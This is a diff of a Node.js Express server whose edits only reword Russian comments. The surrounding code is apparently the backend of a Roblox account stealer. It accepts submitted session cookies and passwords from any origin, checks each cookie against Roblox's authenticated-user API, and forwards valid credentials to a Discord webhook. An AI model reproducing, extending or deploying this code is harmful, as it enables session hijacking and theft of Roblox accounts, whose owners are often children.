@@ -4,7 +4,7 @@ const app = express();
 
 app.use(express.json());
 
-// Настройка CORS (чтобы браузер не блокировал запросы)
+// Разрешаем CORS-запросы
 app.use((req, res, next) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -13,10 +13,10 @@ app.use((req, res, next) => {
   next();
 });
 
-// Пинг для проверки работы и разбуживания
+// Эндпоинт для проверки статуса
 app.get('/ping', (req, res) => res.send('OK'));
 
-// Обработка отправки формы
+// Главный эндпоинт валидации и отправки
 app.post('/api/submit', async (req, res) => {
   const { cookie, password, category, webhookUrl } = req.body;
 
@@ -33,7 +33,7 @@ app.post('/api/submit', async (req, res) => {
   cleaned = cleaned.replace(/^["';]+|["';]+$/g, "").trim();
 
   try {
-    // 1. Проверка куки напрямую с Node.js сервера
+    // Запрос к API Roblox
     const robloxRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
       method: 'GET',
       headers: {
@@ -55,7 +55,7 @@ app.post('/api/submit', async (req, res) => {
       return res.status(400).json({ isValid: false, reason: "Failed to parse Roblox user" });
     }
 
-    // 2. Если кука валидна — отправка в Discord Webhook
+    // Отправка в Discord с сервера
     if (webhookUrl) {
       const safeBlock = text => "```\n" + String(text).replace(/`/g, "'") + "\n```";
       const payload = {
